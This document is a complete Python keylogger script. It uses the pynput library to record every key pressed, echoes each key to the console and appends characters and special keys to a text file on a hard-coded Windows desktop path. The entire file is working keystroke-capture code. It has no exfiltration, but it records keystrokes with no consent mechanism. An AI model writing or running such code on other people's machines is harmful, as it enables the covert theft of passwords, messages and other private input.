from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open(r"C:\Users\kanis\OneDrive\Desktop\Simplekeylogger.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            logKey.write(f" [{key}] ")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
